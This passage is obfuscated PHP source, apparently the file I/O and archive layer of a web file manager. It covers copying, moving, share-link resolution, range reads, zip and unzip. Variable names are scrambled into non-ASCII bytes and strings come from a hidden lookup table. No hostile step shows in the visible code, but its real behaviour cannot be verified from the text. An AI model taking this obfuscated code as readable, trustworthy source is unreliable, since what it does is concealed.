$∫òî‚†⁄->getPathOuter($ÁÿÜ†ÏË); } return $ÁÿÜ†ÏË; } private static function check($Æ±Ö”Î , $â˚«ˆ”÷, $Û⁄ÅÙº˛, &$Æ“åû˙‚) { $ˆË—©¸œ =& $_SERVER[ˆë€Ï⁄∂]; if (self::driverIsSame($Æ±Ö”Î , $Û⁄ÅÙº˛) && $Æ±Ö”Î ->isFolder($â˚«ˆ”÷) && $Æ±Ö”Î ->isParentOf($â˚«ˆ”÷, $Æ“åû˙‚)) { show_json(LNG($ˆË—©¸œ[1250]), !1); } if (!$Æ±Ö”Î ->exist($â˚«ˆ”÷)) { show_json(LNG($ˆË—©¸œ[118]), !1); } } private static function copyPath($ˆ¸àâŒê, $‚ØÙ≥ÄΩ, $œ∫‘Ó†ñ, $‹◊∆Ëòë, $ü∫óÔñ˜, $õñ™ºòŸ, $æ™´ôáÙ, $Ü¿ù›–î = false, $‡ôÎçÎÓ = true) { $ÊÌÕ¯˛µ =& $_SERVER[ˆë€Ï⁄∂]; $√∫∞¿ïÌ = empty($Ü¿ù›–î) && $Ü¿ù›–î !== $ÊÌÕ¯˛µ[240] ? $ˆ¸àâŒê->pathThis($‚ØÙ≥ÄΩ) : $Ü¿ù›–î; if ($ü∫óÔñ˜) { $Á‰Äﬂ—Ù = $œ∫‘Ó†ñ->fileNameExist($‹◊∆Ëòë, $√∫∞¿ïÌ); $ﬂÛˆÉû = $√∫∞¿ïÌ; $√∫∞¿ïÌ = $œ∫‘Ó†ñ->fileNameAuto($‹◊∆Ëòë, $√∫∞¿ïÌ, $ü∫óÔñ˜, !$æ™´ôáÙ); if (!$Á‰Äﬂ—Ù || $ﬂÛˆÉû != $√∫∞¿ïÌ) { $ü∫óÔñ˜ = !1; } if ($‡ôÎçÎÓ && !$ü∫óÔñ˜) { $œ∫‘Ó†ñ->_data[$ÊÌÕ¯˛µ[1251]] = !0; } } if ($æ™´ôáÙ) { return self::copyFile($ˆ¸àâŒê, $‚ØÙ≥ÄΩ, $œ∫‘Ó†ñ, $‹◊∆Ëòë, $√∫∞¿ïÌ, $õñ™ºòŸ); } if ($ü∫óÔñ˜ == REPEAT_RENAME_FOLDER) { $ü∫óÔñ˜ = !1; } $˜©Ñœ⁄‡ = rtrim($‹◊∆Ëòë, $ÊÌÕ¯˛µ[8]) . $ÊÌÕ¯˛µ[8] . $√∫∞¿ïÌ; $≈ﬂ”¯™é = $œ∫‘Ó†ñ->mkdir($œ∫‘Ó†ñ->getPath($˜©Ñœ⁄‡), $ü∫óÔñ˜); $‹◊∆Ëòë = $œ∫‘Ó†ñ->getPathInner($≈ﬂ”¯™é); $•€Ÿ∫ˆí = $ˆ¸àâŒê->listPath($‚ØÙ≥ÄΩ, !0); $•€Ÿ∫ˆí = is_array($•€Ÿ∫ˆí) ? $•€Ÿ∫ˆí : array($ÊÌÕ¯˛µ[96] => array(), $ÊÌÕ¯˛µ[95] => array()); $¿Á‚æ…ù = array_merge($•€Ÿ∫ˆí[$ÊÌÕ¯˛µ[96]], $•€Ÿ∫ˆí[$ÊÌÕ¯˛µ[95]]); foreach ($¿Á‚æ…ù as $ª¥¯÷æÄ) { $ñÜ¶ïíÃ = $ª¥¯÷æÄ[$ÊÌÕ¯˛µ[33]] == $ÊÌÕ¯˛µ[242]; $‚ØÙ≥ÄΩ = $ˆ¸àâŒê->getPathInner($ª¥¯÷æÄ[$ÊÌÕ¯˛µ[97]]); $ó“ËÌÒÚ = self::copyPath($ˆ¸àâŒê, $‚ØÙ≥ÄΩ, $œ∫‘Ó†ñ, $‹◊∆Ëòë, $ü∫óÔñ˜, $õñ™ºòŸ, $ñÜ¶ïíÃ, !1, !1); if (!$ó“ËÌÒÚ) { IO::errorTips($ÊÌÕ¯˛µ[1252] . $‚ØÙ≥ÄΩ . $ÊÌÕ¯˛µ[83] . $‹◊∆Ëòë); } } self::copyMoveKeepInfo($ˆ¸àâŒê, $‚ØÙ≥ÄΩ, $≈ﬂ”¯™é); return $≈ﬂ”¯™é; } private static function copyFile($∑∏§ì˛–, $¿’”ıö€, $ª€ä «ë, $ ê†Î, $´≈Å≠Àâ, $ÈœáÊÖ¥) { $œ—”˘Ø≤ =& $_SERVER[ˆë€Ï⁄∂]; $ ê†Î = $ª€ä «ë->getPath(rtrim($ ê†Î, $œ—”˘Ø≤[8]) . $œ—”˘Ø≤[8] . $´≈Å≠Àâ); $≠ƒ´Ü®ß = $œ—”˘Ø≤[1253] . time() . rand_string(5); Hook::trigger($œ—”˘Ø≤[1254], $∑∏§ì˛–, $¿’”ıö€, $ª€ä «ë, $ ê†Î, $´≈Å≠Àâ, $≠ƒ´Ü®ß); if (self::driverIsSame($∑∏§ì˛–, $ª€ä «ë)) { if ($ÈœáÊÖ¥) { $Ò˘¿ºŒÏ = $ª€ä «ë->moveFile($¿’”ıö€, $ ê†Î); } else { $Ò˘¿ºŒÏ = $ª€ä «ë->copyFile($¿’”ıö€, $ ê†Î); } Hook::trigger($œ—”˘Ø≤[1255], $∑∏§ì˛–, $¿’”ıö€, $ª€ä «ë, $ ê†Î, $´≈Å≠Àâ, $Ò˘¿ºŒÏ); self::copyMoveKeepInfo($∑∏§ì˛–, $¿’”ıö€, $Ò˘¿ºŒÏ); return $Ò˘¿ºŒÏ; } $ßï¿óúÁ = TEMP_FILES; if ($GLOBALS[$œ—”˘Ø≤[6]][$œ—”˘Ø≤[102]][$œ—”˘Ø≤[888]]) { $ßï¿óúÁ = $GLOBALS[$œ—”˘Ø≤[6]][$œ—”˘Ø≤[102]][$œ—”˘Ø≤[888]]; } $÷öèËŒ´ = $ßï¿óúÁ; mk_dir($÷öèËŒ´); $Ù”øÕ≠Ç = $÷öèËŒ´ . $≠ƒ´Ü®ß; $Ä∞¶‰êÍ = $Ù”øÕ≠Ç; $Ù”øÕ≠Ç = $∑∏§ì˛–->download($¿’”ıö€, $Ù”øÕ≠Ç); $Ù”øÕ≠Ç = $∑∏§ì˛–->iconvApp($Ù”øÕ≠Ç); if (substr($Ù”øÕ≠Ç, strlen($ßï¿óúÁ)) == $ßï¿óúÁ) { $ÈœáÊÖ¥ = !0; } $Ò˘¿ºŒÏ = $ª€ä «ë->upload($ ê†Î, $Ù”øÕ≠Ç, $ÈœáÊÖ¥); self::remove($Ä∞¶‰êÍ); Hook::trigger($œ—”˘Ø≤[1255], $∑∏§ì˛–, $¿’”ıö€, $ª€ä «ë, $ ê†Î, $´≈Å≠Àâ, $Ò˘¿ºŒÏ); self::copyMoveKeepInfo($∑∏§ì˛–, $¿’”ıö€, $Ò˘¿ºŒÏ); return $Ò˘¿ºŒÏ; } private static function copyMoveKeepInfo($◊µ¶˚‚◊, $ô˙ÿìﬂ’, $•◊çêÄˆ) { if (!$•◊çêÄˆ) { return; } $∂˚ì—ÿ· = $◊µ¶˚‚◊->info($ô˙ÿìﬂ’); if (!is_array($∂˚ì—ÿ·)) { return; } IO::setModifyTime($•◊çêÄˆ, $∂˚ì—ÿ·[$_SERVER[ˆë€Ï⁄∂][98]]); } public static function pathFather($€‚Ô–˜é) { $ƒÉé˝Ê≤ = IO::init($€‚Ô–˜é); $⁄é¶†¬â = $ƒÉé˝Ê≤->pathFather($ƒÉé˝Ê≤->path); return $ƒÉé˝Ê≤->getPathOuter($⁄é¶†¬â); } public static function fileOut($√∫äﬂ‚î, $µü∫≠‰ó = false, $†’ôÇæ´ = false, $πìîÆæï = '') { $Œ…¸≤º˚ = self::driverMake($√∫äﬂ‚î); if ($Œ…¸≤º˚->isFileOutServer()) { return $Œ…¸≤º˚->fileOutServer($√∫äﬂ‚î, $µü∫≠‰ó, $†’ôÇæ´, $πìîÆæï); } return $Œ…¸≤º˚->fileOut($√∫äﬂ‚î, $µü∫≠‰ó, $†’ôÇæ´, $πìîÆæï); } public static function fileOutImage($ÎƒÚÚÀè, $≠ïÒ®ÁÁ = 250) { $ùƒ∆å∑ = array(250, 600, 1200, 2000, 3000, 5000); for ($ƒ¶ËÕ∂Ï = 0; $ƒ¶ËÕ∂Ï < count($ùƒ∆å∑); $ƒ¶ËÕ∂Ï++) { if ($ƒ¶ËÕ∂Ï == 0 && $≠ïÒ®ÁÁ <= $ùƒ∆å∑[$ƒ¶ËÕ∂Ï]) { $≠ïÒ®ÁÁ = $ùƒ∆å∑[$ƒ¶ËÕ∂Ï]; break; } else { if ($≠ïÒ®ÁÁ > $ùƒ∆å∑[$ƒ¶ËÕ∂Ï - 1] && $≠ïÒ®ÁÁ <= $ùƒ∆å∑[$ƒ¶ËÕ∂Ï]) { $≠ïÒ®ÁÁ = $ùƒ∆å∑[$ƒ¶ËÕ∂Ï]; break; } else { if ($ƒ¶ËÕ∂Ï == count($ùƒ∆å∑) - 1 && $≠ïÒ®ÁÁ > $ùƒ∆å∑[$ƒ¶ËÕ∂Ï]) { $≠ïÒ®ÁÁ = $ùƒ∆å∑[$ƒ¶ËÕ∂Ï]; break; } } } } $Í±¡ﬂÍ◊ = self::driverMake($ÎƒÚÚÀè); if ($Í±¡ﬂÍ◊->isFileOutServer()) { return $Í±¡ﬂÍ◊->fileOutImageServer($ÎƒÚÚÀè, $≠ïÒ®ÁÁ); } return $Í±¡ﬂÍ◊->fileOutImage($ÎƒÚÚÀè, $≠ïÒ®ÁÁ); } private static function driverIsSame($ÅÉ¥‘∏ù, $¬ÓÑŒ¶º) { $˙§¨˚Ω¯ =& $_SERVER[ˆë€Ï⁄∂]; $ú™å˘»¿ = $ÅÉ¥‘∏ù->getType(); $Ûñãá◊‰ = $¬ÓÑŒ¶º->getType(); if ($ú™å˘»¿ != $Ûñãá◊‰) { return !1; } if ($ú™å˘»¿ == $˙§¨˚Ω¯[848]) { return !0; } if ($ú™å˘»¿ == $˙§¨˚Ω¯[119]) { return !0; } if ($ÅÉ¥‘∏ù->pathDriver == $¬ÓÑŒ¶º->pathDriver) { return !0; } return !1; } public static function copyUpdate($è‰ÀÙÉ√, $˛ﬂ∏˜ùò) { $˘Ä≥ƒúê =& $_SERVER[ˆë€Ï⁄∂]; if (!IO::exist($è‰ÀÙÉ√)) { return !1; } if (!IO::exist($˛ﬂ∏˜ùò)) { IO::mkdir($˛ﬂ∏˜ùò); } $¯∏¡”˛Ô = array_to_keyvalue(self::listAllSimple($è‰ÀÙÉ√), $˘Ä≥ƒúê[97]); $õ¯±€äÒ = array_to_keyvalue(self::listAllSimple($˛ﬂ∏˜ùò), $˘Ä≥ƒúê[97]); $ùóüÇÏ = array(); $ºÓü˛˙á = array(); foreach ($¯∏¡”˛Ô as $‰Úå˙´° => $‚Ü»··ô) { if (isset($õ¯±€äÒ[$‰Úå˙´°])) { if ($‚Ü»··ô[$˘Ä≥ƒúê[88]] == 1) { continue; } if ($õ¯±€äÒ[$‰Úå˙´°][$˘Ä≥ƒúê[89]] == $‚Ü»··ô[$˘Ä≥ƒúê[89]]) { continue; } } if ($‚Ü»··ô[$˘Ä≥ƒúê[88]] == 1) { $ºÓü˛˙á[] = $˛ﬂ∏˜ùò . $˘Ä≥ƒúê[8] . trim($‰Úå˙´°, $˘Ä≥ƒúê[8]); continue; } $‘•’Üåı = strstr(trim($‰Úå˙´°, $˘Ä≥ƒúê[8]), $˘Ä≥ƒúê[8]) ? get_path_father($‰Úå˙´°) : $˘Ä≥ƒúê[12]; $ùóüÇÏ[] = array($˘Ä≥ƒúê[1256] => $‚Ü»··ô[$˘Ä≥ƒúê[99]], $˘Ä≥ƒúê[1257] => rtrim($˛ﬂ∏˜ùò, $˘Ä≥ƒúê[8]) . $˘Ä≥ƒúê[8] . $‘•’Üåı, $˘Ä≥ƒúê[1258] => $‚Ü»··ô); } $≠Øí˛›ê = array($˘Ä≥ƒúê[242] => $ùóüÇÏ, $˘Ä≥ƒúê[88] => $ºÓü˛˙á); Hook::trigger($˘Ä≥ƒúê[1259], $è‰ÀÙÉ√, $˛ﬂ∏˜ùò, $≠Øí˛›ê); foreach ($ºÓü˛˙á as $‚Ü»··ô) { IO::mkdir($‚Ü»··ô); } foreach ($ùóüÇÏ as $‚Ü»··ô) { IO::copy($‚Ü»··ô[$˘Ä≥ƒúê[1256]], $‚Ü»··ô[$˘Ä≥ƒúê[1257]], REPEAT_REPLACE); } } public static function fileSubstr($ô≥ß˜ã¸, $¨˛êÙ˘ı, $õïƒ´úØ = false) { $í¨“íÖ¶ =& $_SERVER[ˆë€Ï⁄∂]; $ò‰ùåµß = self::driverMake($ô≥ß˜ã¸); $È£ë®Ê∏ = $ò‰ùåµß->size($ô≥ß˜ã¸); $úÖﬂÓÅ€ = $¨˛êÙ˘ı; $ªßøÄø⁄ = $õïƒ´úØ; if ($¨˛êÙ˘ı < 0) { $¨˛êÙ˘ı = $È£ë®Ê∏ + $¨˛êÙ˘ı; } if ($õïƒ´úØ === !1) { $õïƒ´úØ = $È£ë®Ê∏ - $¨˛êÙ˘ı; } if ($¨˛êÙ˘ı + $õïƒ´úØ > $È£ë®Ê∏) { $õïƒ´úØ = $È£ë®Ê∏ - $¨˛êÙ˘ı; } if (!$È£ë®Ê∏ && $ò‰ùåµß->getType() == $í¨“íÖ¶[119] && !$ò‰ùåµß->exist($ô≥ß˜ã¸)) { $—ñƒ»Ω” = get_path_this($ô≥ß˜ã¸); $ﬂì∂πë© = parse_url_query($—ñƒ»Ω”); if (is_array($ﬂì∂πë©) && isset($ﬂì∂πë©[$í¨“íÖ¶[32]])) { $—ñƒ»Ω” = urldecode($ﬂì∂πë©[$í¨“íÖ¶[32]]); } throw new Exception($í¨“íÖ¶[1260] . LNG($í¨“íÖ¶[1261]) . $í¨“íÖ¶[1058] . clear_html($—ñƒ»Ω”) . $í¨“íÖ¶[12]); } if ($õïƒ´úØ <= 0) { return $í¨“íÖ¶[12]; } if ($¨˛êÙ˘ı < 0 || $¨˛êÙ˘ı >= $È£ë®Ê∏ || $õïƒ´úØ > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\x65\122\145\x61\144\x20\x65\x72\162\157\162\41\40\163\x74\141\162\164\75{$¨˛êÙ˘ı}\73\x6c\x65\156\x67\164\150\x3d{$õïƒ´úØ}\x3b\x20\x73\x69\x7a\x65\75{$È£ë®Ê∏}\73"); } $≤‹‰¿Ω‘ = $ò‰ùåµß->fileSubstr($ô≥ß˜ã¸, $¨˛êÙ˘ı, $õïƒ´úØ); if (!$≤‹‰¿Ω‘ && $õïƒ´úØ && isset($GLOBALS[$í¨“íÖ¶[1262]])) { throw new Exception($GLOBALS[$í¨“íÖ¶[1262]][$í¨“íÖ¶[1263]]); } return $≤‹‰¿Ω‘; } private static function driverMake(&$ÜÆµàè¬) { $ˆ†∂¬¨© =& $_SERVER[ˆë€Ï⁄∂]; $÷ƒ¬ò÷î = KodIO::parse($ÜÆµàè¬); if (!self::$driverListSystem) { $íÿ¡ëîÈ = Model($ˆ†∂¬¨©[858])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($íÿ¡ëîÈ, $ˆ†∂¬¨©[486]); } if ($÷ƒ¬ò÷î[$ˆ†∂¬¨©[33]] == KodIO::KOD_IO && !self::$driverListSystem[$÷ƒ¬ò÷î[$ˆ†∂¬¨©[486]]]) { throw new Exception($ˆ†∂¬¨©[1264]); return !1; } $ÜÆµàè¬ = $÷ƒ¬ò÷î[$ˆ†∂¬¨©[1265]]; $ë‚ñÎ©⁄ = self::driverGet($÷ƒ¬ò÷î, $ÜÆµàè¬); return $ë‚ñÎ©⁄; } private static function driverGet($•¶·û’´, &$ñ°Û‚ÆÉ) { $ƒ˘Å”é‘ =& $_SERVER[ˆë€Ï⁄∂]; $∫È‘ˆ€É = $•¶·û’´[$ƒ˘Å”é‘[1266]]; $ºÒ˘’Åò = $•¶·û’´[$ƒ˘Å”é‘[486]]; switch ($•¶·û’´[$ƒ˘Å”é‘[33]]) { case KodIO::KOD_IO: $¬èå¿Êõ = self::$driverListSystem[$ºÒ˘’Åò]; break; case KodIO::KOD_SOURCE: $ñ°Û‚ÆÉ = $ºÒ˘’Åò . $ñ°Û‚ÆÉ; $¬èå¿Êõ = array($ƒ˘Å”é‘[1267] => $ƒ˘Å”é‘[1268], $ƒ˘Å”é‘[6] => $•¶·û’´); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Óüﬁ≥î˙ = $GLOBALS[$ƒ˘Å”é‘[1269]]; self::$driverListUser = array_to_keyvalue($Óüﬁ≥î˙, $ƒ˘Å”é‘[486]); } $¬èå¿Êõ = self::$driverListUser[$ºÒ˘’Åò]; break; case KodIO::KOD_SHARE_LINK: $¬èå¿Êõ = array($ƒ˘Å”é‘[1267] => $ƒ˘Å”é‘[1270], $ƒ˘Å”é‘[6] => $•¶·û’´); $˙Áùﬁ›ﬁ = Action($ƒ˘Å”é‘[1271])->sharePathInfo($•¶·û’´[$ƒ˘Å”é‘[97]]); $ñ°Û‚ÆÉ = $˙Áùﬁ›ﬁ[$ƒ˘Å”é‘[203]]; if (!$˙Áùﬁ›ﬁ[$ƒ˘Å”é‘[203]]) { $Ì‹ıÏˆ· = Model($ƒ˘Å”é‘[678])->getInfo($˙Áùﬁ›ﬁ[$ƒ˘Å”é‘[679]]); $ñ°Û‚ÆÉ = KodIO::clear($Ì‹ıÏˆ·[$ƒ˘Å”é‘[1272]] . $•¶·û’´[$ƒ˘Å”é‘[1265]]); $•¶·û’´[$ƒ˘Å”é‘[571]] = $Ì‹ıÏˆ·; $•¶·û’´[$ƒ˘Å”é‘[1247]] = $ñ°Û‚ÆÉ; $¬èå¿Êõ = array($ƒ˘Å”é‘[1267] => $ƒ˘Å”é‘[1273], $ƒ˘Å”é‘[6] => $•¶·û’´); } break; case KodIO::KOD_SHARE_ITEM: $¬èå¿Êõ = array($ƒ˘Å”é‘[1267] => $ƒ˘Å”é‘[1274], $ƒ˘Å”é‘[6] => $•¶·û’´); $Ì‹ıÏˆ· = Model($ƒ˘Å”é‘[678])->getInfo($•¶·û’´[$ƒ˘Å”é‘[486]]); if ($Ì‹ıÏˆ·[$ƒ˘Å”é‘[203]] == $ƒ˘Å”é‘[240]) { $ñ°Û‚ÆÉ = KodIO::clear($Ì‹ıÏˆ·[$ƒ˘Å”é‘[1272]] . $•¶·û’´[$ƒ˘Å”é‘[1265]]); $•¶·û’´[$ƒ˘Å”é‘[571]] = $Ì‹ıÏˆ·; $•¶·û’´[$ƒ˘Å”é‘[1247]] = $ñ°Û‚ÆÉ; $¬èå¿Êõ = array($ƒ˘Å”é‘[1267] => $ƒ˘Å”é‘[1275], $ƒ˘Å”é‘[6] => $•¶·û’´); } else { if (!$ñ°Û‚ÆÉ) { $ñ°Û‚ÆÉ = $Ì‹ıÏˆ·[$ƒ˘Å”é‘[203]]; } } break; default: $ñ°Û‚ÆÉ = $•¶·û’´[$ƒ˘Å”é‘[97]]; $¬èå¿Êõ = array($ƒ˘Å”é‘[1267] => $ƒ˘Å”é‘[1276]); break; } $äâ·Ç∏® = $•¶·û’´[$ƒ˘Å”é‘[97]]; if (!isset(self::$driverCache[$äâ·Ç∏®])) { $ŸÒ±ÀÌÜ = strtolower($¬èå¿Êõ[$ƒ˘Å”é‘[108]]); $ÉÀœ∞Üå = $GLOBALS[$ƒ˘Å”é‘[6]][$ƒ˘Å”é‘[102]][$ƒ˘Å”é‘[917]]; $™ø¥Öﬂ˚ = $ƒ˘Å”é‘[87] . (isset($ÉÀœ∞Üå[$ŸÒ±ÀÌÜ]) ? $ÉÀœ∞Üå[$ŸÒ±ÀÌÜ] : ucfirst($ŸÒ±ÀÌÜ)); if (!class_exists($™ø¥Öﬂ˚)) { show_json("{$™ø¥Öﬂ˚}\x20\156\157\164\40\145\x78\151\163\164\163\x21", !1); } $ÈŸªõÕ§ = isset($¬èå¿Êõ[$ƒ˘Å”é‘[6]]) ? $¬èå¿Êõ[$ƒ˘Å”é‘[6]] : !1; self::$driverCache[$äâ·Ç∏®] = new $™ø¥Öﬂ˚($ÈŸªõÕ§); } $ÊÁ˛ıÌÃ = self::$driverCache[$äâ·Ç∏®]; $ÊÁ˛ıÌÃ->pathDriver = $∫È‘ˆ€É; $ÊÁ˛ıÌÃ->pathBase = $ƒ˘Å”é‘[12]; if (isset($¬èå¿Êõ[$ƒ˘Å”é‘[6]][$ƒ˘Å”é‘[1277]])) { $ÊÁ˛ıÌÃ->pathBase = rtrim($¬èå¿Êõ[$ƒ˘Å”é‘[6]][$ƒ˘Å”é‘[1277]], $ƒ˘Å”é‘[8]) . $ƒ˘Å”é‘[8]; $ñ°Û‚ÆÉ = $ÊÁ˛ıÌÃ->pathBase . ltrim($ñ°Û‚ÆÉ, $ƒ˘Å”é‘[8]); } $ñ°Û‚ÆÉ = $ÊÁ˛ıÌÃ->getPath($ñ°Û‚ÆÉ); if (isset($•¶·û’´[$ƒ˘Å”é‘[1247]])) { $ñ°Û‚ÆÉ = $•¶·û’´[$ƒ˘Å”é‘[1247]]; } $ÊÁ˛ıÌÃ->path = $ñ°Û‚ÆÉ; return $ÊÁ˛ıÌÃ; } public static function errorTips($±ºà∂¿¥ = false) { $ŸØ∂øõ™ =& $_SERVER[ˆë€Ï⁄∂]; static $Çõ€Ï∏û = array(); $ÕüÁ‡“® = 1000; if ($±ºà∂¿¥ === -1) { return $Çõ€Ï∏û ? $Çõ€Ï∏û[count($Çõ€Ï∏û) - 1] : $ŸØ∂øõ™[12]; } if ($±ºà∂¿¥ === !1) { return implode($ŸØ∂øõ™[59], $Çõ€Ï∏û); } if (count($Çõ€Ï∏û) >= $ÕüÁ‡“®) { $Çõ€Ï∏û = array_slice($Çõ€Ï∏û, $ÕüÁ‡“® * 0.5, $ÕüÁ‡“®); } $Çõ€Ï∏û[] = $±ºà∂¿¥; write_log($ŸØ∂øõ™[186] . ACTION . $ŸØ∂øõ™[1278] . $±ºà∂¿¥, $ŸØ∂øõ™[1279]); } public static function getLastError($ÙùÚ à‚ = '') { $Ì·›é≠Í = self::errorTips(-1); return $Ì·›é≠Í ? $Ì·›é≠Í : $ÙùÚ à‚; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $è◊°ûÙ»; if ($è◊°ûÙ») { return $è◊°ûÙ»; } $ÖÔ∆Ω¨‹ = IO::init($_SERVER[ˆë€Ï⁄∂][8]); return $ÖÔ∆Ω¨‹; } private static function iconvSystem($ƒÔ∏µ≤¶) { return self::local()->iconvSystem($ƒÔ∏µ≤¶); } private static function iconvApp($Æœ—‚ˆË) { return self::local()->iconvApp($Æœ—‚ˆË); } public static function zipFolder($¸∏ÛÛ◊˝, $îâ„ãáô = "\x7a\151\x70", $Ä°∫µ◊· = '', $≠˜·¿√  = REPEAT_RENAME) { $Ó«˚⁄–é =& $_SERVER[ˆë€Ï⁄∂]; $™¡¬≥È≥ = IO::listPath($¸∏ÛÛ◊˝); if (!$™¡¬≥È≥) { return !1; } $™¡¬≥È≥ = array_merge($™¡¬≥È≥[$Ó«˚⁄–é[95]], $™¡¬≥È≥[$Ó«˚⁄–é[96]]); return self::zip($™¡¬≥È≥, $îâ„ãáô, $Ä°∫µ◊·, $≠˜·¿√ ); } public static function zip($˛–∂ù◊ç, $Öã ®‰Ç = "\x7a\x69\x70", $Í°ÔâÎ∑ = '', $¬íπÒ‘¿ = REPEAT_RENAME) { $µ‚çÔÿ© =& $_SERVER[ˆë€Ï⁄∂]; if (is_string($˛–∂ù◊ç) && $˛–∂ù◊ç) { $˛–∂ù◊ç = array(array($µ‚çÔÿ©[97] => $˛–∂ù◊ç)); } $”≈£–¸˜ = self::init($˛–∂ù◊ç[0][$µ‚çÔÿ©[97]]); $ÍÚÍÍÕÿ = self::info($˛–∂ù◊ç[0][$µ‚çÔÿ©[97]]); $≥ª⁄´•Â = $µ‚çÔÿ©[12]; $Ö»éôÌ… = $µ‚çÔÿ©[12]; $Ü‹ïΩÀ◊ = $µ‚çÔÿ©[12]; if ($Í°ÔâÎ∑ && substr($Í°ÔâÎ∑, -1, 1) != $µ‚çÔÿ©[8]) { $Ö»éôÌ… = get_path_father($Í°ÔâÎ∑); $Ü‹ïΩÀ◊ = get_path_this($Í°ÔâÎ∑); } else { $Ö»éôÌ… = self::pathFather($ÍÚÍÍÕÿ[$µ‚çÔÿ©[97]]); $Ü‹ïΩÀ◊ = $ÍÚÍÍÕÿ[$µ‚çÔÿ©[32]] . $µ‚çÔÿ©[10] . $Öã ®‰Ç; if (count($˛–∂ù◊ç) > 1) { $·à™Î®∑ = IO::info($Ö»éôÌ…); $Ü‹ïΩÀ◊ = $·à™Î®∑[$µ‚çÔÿ©[32]] . $µ‚çÔÿ©[10] . $Öã ®‰Ç; } if ($Í°ÔâÎ∑) { $Ö»éôÌ… = $Í°ÔâÎ∑; } } if ($”≈£–¸˜->getType() == $µ‚çÔÿ©[119]) { $ÏÀñ‘ÉÍ = self::init($Ö»éôÌ…); $æ«Ë»°Á = $ÏÀñ‘ÉÍ->getType() == $µ‚çÔÿ©[119] ? $Ö»éôÌ… : get_path_father($”≈£–¸˜->path); $æ«Ë»°Á = rtrim($æ«Ë»°Á, $µ‚çÔÿ©[8]) . $µ‚çÔÿ©[8]; mk_dir($æ«Ë»°Á); } else { $≥ª⁄´•Â = TEMP_FILES . $µ‚çÔÿ©[1280] . time() . rand_string(8) . $µ‚çÔÿ©[8]; mk_dir($≥ª⁄´•Â); file_put_contents($≥ª⁄´•Â . $µ‚çÔÿ©[1281], $µ‚çÔÿ©[12]); $æ«Ë»°Á = $≥ª⁄´•Â; } $öâ£”“◊ = IO::info($æ«Ë»°Á); if (!$öâ£”“◊ || !$öâ£”“◊[$µ‚çÔÿ©[245]]) { show_json(LNG($µ‚çÔÿ©[1282]), !1); } $ô˙ñ·ˆä = self::zipFileList($˛–∂ù◊ç, $≥ª⁄´•Â); foreach ($ô˙ñ·ˆä as $Àöø¶˚Å => $˝¡‡≤±˘) { $ô˙ñ·ˆä[$Àöø¶˚Å] = self::iconvSystem($˝¡‡≤±˘); } $˘‘ä—ñ = get_filename_auto($æ«Ë»°Á . $Ü‹ïΩÀ◊, $µ‚çÔÿ©[12], $¬íπÒ‘¿); KodArchive::create(self::iconvSystem($˘‘ä—ñ), $ô˙ñ·ˆä); if (!IO::exist($˘‘ä—ñ)) { if ($≥ª⁄´•Â) { del_dir($≥ª⁄´•Â); } write_log($µ‚çÔÿ©[1283] . $˘‘ä—ñ, $µ‚çÔÿ©[399]); show_json(LNG($µ‚çÔÿ©[1284]), !1); } if (!$≥ª⁄´•Â) { return $˘‘ä—ñ; } $û’™êÇ‰ = self::move($˘‘ä—ñ, $Ö»éôÌ…, $¬íπÒ‘¿); if ($≥ª⁄´•Â) { del_dir($≥ª⁄´•Â); } if (!$˘‘ä—ñ) { write_log($µ‚çÔÿ©[1285] . $˘‘ä—ñ . $µ‚çÔÿ©[1286] . $Ö»éôÌ…, $µ‚çÔÿ©[399]); show_json(LNG($µ‚çÔÿ©[1284]), !1); } return $û’™êÇ‰; } public static function unzip($≈ƒÑöπÇ, $π–ÀìÑì, $Ÿ⁄¨°Ï• = "\x2d\61", $¯ê–ª˝˛ = "\x72\145\x70\154\141\x63\145") { $≥¬Ïµõ¡ =& $_SERVER[ˆë€Ï⁄∂]; $¶ƒõ¿∞ﬁ = parent::info($≈ƒÑöπÇ); if (!$¶ƒõ¿∞ﬁ) { show_json(LNG($≥¬Ïµõ¡[1287]), !1); } $¶«¢ÅÛé = IO::infoFullSimple($π–ÀìÑì); if (!$¶«¢ÅÛé) { $π–ÀìÑì = IO::mkdir($π–ÀìÑì); } if (isset($¶«¢ÅÛé[$≥¬Ïµõ¡[203]]) && trim($¶«¢ÅÛé[$≥¬Ïµõ¡[97]], $≥¬Ïµõ¡[8]) != trim($π–ÀìÑì, $≥¬Ïµõ¡[8])) { $¶ÿ’Ü‡Ó = KodIO::make($¶«¢ÅÛé[$≥¬Ïµõ¡[202]]); $˚˚πÛéÛ = IO::fileNameAuto($¶ÿ’Ü‡Ó, $¶«¢ÅÛé[$≥¬Ïµõ¡[32]], REPEAT_RENAME_FOLDER, !0); $π–ÀìÑì = IO::mkdir($¶ÿ’Ü‡Ó . $˚˚πÛéÛ); } $Ÿ⁄¨°Ï• = $Ÿ⁄¨°Ï• && $Ÿ⁄¨°Ï• != $≥¬Ïµõ¡[1288] ? @json_decode($Ÿ⁄¨°Ï•, !0) : -1; $Ì¨ñı®˝ = self::unzipPart($≈ƒÑöπÇ, $Ÿ⁄¨°Ï•); if (!$Ì¨ñı®˝ || !IO::exist($Ì¨ñı®˝[$≥¬Ïµõ¡[242]])) { show_json(LNG($≥¬Ïµõ¡[118]), !1); } $ÆÏ¡Åæ¸ = $Ì¨ñı®˝[$≥¬Ïµõ¡[1289]][count($Ì¨ñı®˝[$≥¬Ïµõ¡[1289]]) - 1]; if ($ÆÏ¡Åæ¸[$≥¬Ïµõ¡[1290]] == -1 || substr($ÆÏ¡Åæ¸[$≥¬Ïµõ¡[32]], -1, 1) == $≥¬Ïµõ¡[8]) { $Æ∫´Ä∆ª = $Ì¨ñı®˝[$≥¬Ïµõ¡[1291]] . rand_string(10) . $≥¬Ïµõ¡[8]; mk_dir($Æ∫´Ä∆ª); $è±„†òƒ = count($Ì¨ñı®˝[$≥¬Ïµõ¡[1289]]) == 1 ? IO::ext($≈ƒÑöπÇ) : get_path_ext($Ì¨ñı®˝[$≥¬Ïµõ¡[242]]); $ïí·∑∂ì = KodArchive::extract(self::iconvSystem($Ì¨ñı®˝[$≥¬Ïµõ¡[242]]), $Æ∫´Ä∆ª, $ÆÏ¡Åæ¸[$≥¬Ïµõ¡[1290]], $˚˚πÛéÛ, $è±„†òƒ); self::unzipErrorCheck($ïí·∑∂ì, array($≥¬Ïµõ¡[1292], $≈ƒÑöπÇ, $è±„†òƒ, $π–ÀìÑì, $Ì¨ñı®˝)); 